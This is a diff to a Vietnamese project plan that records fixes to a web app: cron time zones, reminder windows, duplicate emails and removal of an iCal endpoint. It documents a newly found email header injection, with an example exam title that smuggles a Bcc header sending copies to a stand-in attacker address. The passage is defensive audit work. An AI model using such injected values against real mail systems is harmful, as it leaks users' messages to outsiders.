@@ -861,17 +861,40 @@ cho 2 service này — Testcontainers/characterization test để Day 61-62).
 ## Day 49 — Dọn nốt Phase 2 + đệm
 
 ```
-□ Hangfire cron chạy sai giờ: "30 0 * * *" hiểu theo UTC → thực tế 07:30 giờ VN
-  □ Truyền TimeZoneInfo vào RecurringJobOptions
+✅ 1. Hangfire cron chạy sai giờ — XONG 2026-08-20
+   ResolveVietnamTimeZone() thử CẢ HAI id: "SE Asia Standard Time" (Windows) và
+   "Asia/Ho_Chi_Minh" (Linux/Docker) — hardcode một cái là vỡ ở môi trường kia.
+   Fallback CreateCustomTimeZone UTC+7 (an toàn vì VN không có DST).
+   ⚠️ Đổi luôn theo ý dùng thật: nhắc mail 00:30 → 07:00 (user đang ngủ thì mail bị
+   đẩy xuống dưới hộp thư), sync IIG 6 giờ → 3 giờ (lịch là dữ liệu bên ngoài).
 
-□ ExamReminderService (:41-67): gửi mail TRƯỚC khi commit EmailSent = true
-  → SaveChanges lỗi sau khi mail đã gửi = lần sau GỬI TRÙNG
-  □ Commit trước khi gửi, hoặc dùng outbox pattern
-  □ Đổi điều kiện ExamDate.Date == hôm nay+3 thành khoảng <= hôm nay+3
-    (hiện job lỡ một ngày là MẤT HẲN lượt nhắc)
+✅ 2. Job lỡ một ngày là MẤT HẲN lượt nhắc — XONG 2026-08-20
+   Đổi `== hôm nay+3` thành khoảng `>= hôm nay && <= hôm nay+3`.
+   ⚠️ Kế hoạch gốc chỉ nêu ca "job lỡ một ngày", nhưng ca NẶNG HƠN là: user đặt nhắc
+   khi kỳ thi chỉ còn 2 ngày → `== 3` vĩnh viễn không khớp → không nhận mail nào.
+   Kèm: đổi UtcNow → giờ VN cho khớp cron, Console.WriteLine → ILogger.
 
-□ iCal injection: escape RegisterUrl khi sinh file .ics (ExamScheduleService.cs:144)
-□ Phân biệt mã lỗi HTTP: hiện MỌI lỗi nghiệp vụ trả 400
+✅ 3. Gửi mail TRÙNG khi SaveChanges lỗi — XONG 2026-08-20
+   Chọn "SaveChanges ngay sau MỖI mail" thay vì commit-trước-khi-gửi (mail lỗi = mất
+   lượt nhắc, tệ hơn bug gốc) hay outbox pattern (over-engineer cho vài mail/ngày).
+   Phạm vi thiệt hại: tối đa MỘT mail trùng thay vì cả lô.
+   ⚠️ Bug tinh vi phát hiện khi tự đọc lại code: phải `r.EmailSent = false` trong
+   catch — nếu SaveChanges là chỗ ném lỗi thì `EmailSent = true` đã nằm trong EF
+   change tracker, và SaveChanges của mail KẾ TIẾP sẽ ghi luôn nó xuống DB.
+   Kèm: try/catch từng mail (1 địa chỉ lỗi không làm chết cả loop).
+
+✅ 4. iCal injection — XONG 2026-08-20, **BỎ HẲN** thay vì vá
+   Nút Download đã gỡ khỏi UI từ trước (docs 12) → endpoint là MÃ CHẾT nhưng vẫn là
+   bề mặt tấn công. Xóa 4 chỗ: controller · interface · service (kèm EscapeIcal,
+   IsSafeHttpUrl) · frontend downloadIcal.
+   ⚠️ Tìm ra 2 lỗ NGOÀI kế hoạch khi vá:
+     • EscapeIcal cũ chỉ xử lý `\n`, bỏ sót `\r` → vá nửa vời (nhiều parser coi `\r`
+       đơn lẻ cũng là hết dòng)
+     • EMAIL HEADER INJECTION ở ExamReminderService: `subject` ghép exam.Title thô →
+       Title chứa "\r\nBcc: attacker@evil.com" là gửi bản sao mail ra ngoài. Nặng hơn
+       iCal vì subject là header SMTP. Vá bằng SingleLine() cho subject + body.
+
+□ 5. Phân biệt mã lỗi HTTP: hiện MỌI lỗi nghiệp vụ trả 400   ← ĐANG LÀM
   □ 401 chưa đăng nhập · 403 không có quyền · 404 không tìm thấy
   → hiện "phiên thi không thuộc tài khoản này" trả 400 = lộ sự tồn tại tài nguyên người khác
 
